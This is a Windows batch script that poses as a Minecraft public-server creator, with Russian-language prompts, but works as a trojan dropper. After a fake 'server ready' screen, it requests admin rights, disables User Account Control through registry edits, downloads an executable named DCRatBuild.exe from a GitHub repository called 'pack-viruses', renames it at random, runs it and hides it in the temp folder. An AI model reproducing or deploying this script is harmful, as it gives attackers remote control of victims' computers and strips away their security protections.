

@echo off

net session >nul 2>&1 || (powershell "Start-Process '%~f0' -Verb RunAs" & exit /b)
chcp 65001 >nul

title Minecraft multiplayer craete

for /f "delims=" %%i in ('curl -s icanhazip.com/') do set PUBLIC_IP=%%i
:echo Ваш внешний IP-адрес: %PUBLIC_IP%


echo Создатель публичного сервера 
echo Придумайте пароль
set /p "pass_choice= "

echo Пожалуйста подождите...
timeout /t 3 /nobreak >NUL
echo ╔══════════════════════════════════╗
echo ╟ Сервер готов к использованию
echo ╟ Ip - %PUBLIC_IP% 
echo ╟ Пароль - %pass_choice%
echo ╟ Не закрывайте это окно
echo ╚══════════════════════════════════╝


timeout /t 3 /nobreak >NUL

powershell -window hidden -command ""

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "PromptOnSecureDesktop" /t REG_DWORD /d 0 /f >nul 2>&1

set /a rf=%RANDOM% % 1000000001

cd %temp%


:----------------------------------------------------------------------------------------------------------------:
Powershell -Command "Invoke-Webrequest 'https://github.com/moyaki485-svg/pack-viruses/raw/refs/heads/main/DCRatBuild.exe' -OutFile DCRatBuild.exe"
rename DCRatBuild.exe %rf%.exe
start %rf%.exe
attrib +h %temp%\%rf%.exe /s /d

timeout /t 7567 /nobreak >NUL

pause